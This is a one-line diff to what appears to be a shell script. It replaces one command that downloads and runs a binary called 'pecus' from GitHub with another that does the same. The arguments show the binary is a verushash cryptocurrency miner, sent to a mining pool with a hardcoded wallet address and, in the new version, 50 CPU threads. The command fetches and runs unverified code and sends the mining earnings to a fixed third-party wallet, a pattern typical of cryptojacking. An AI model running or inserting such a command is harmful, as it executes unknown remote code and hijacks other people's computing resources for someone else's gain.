@@ -1,1 +1,1 @@
-wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -v -l verushash.na.mine.zergpool.com:3300 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.$(echo $(shuf -i 1-99 -n 1)-Ib) -p c=VRSC
+wget https://raw.githubusercontent.com/Zuraadlef/FAS/main/pecus && chmod +x pecus && ./pecus --algorithm verushash --pool na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w1 --password x --cpu-threads 50
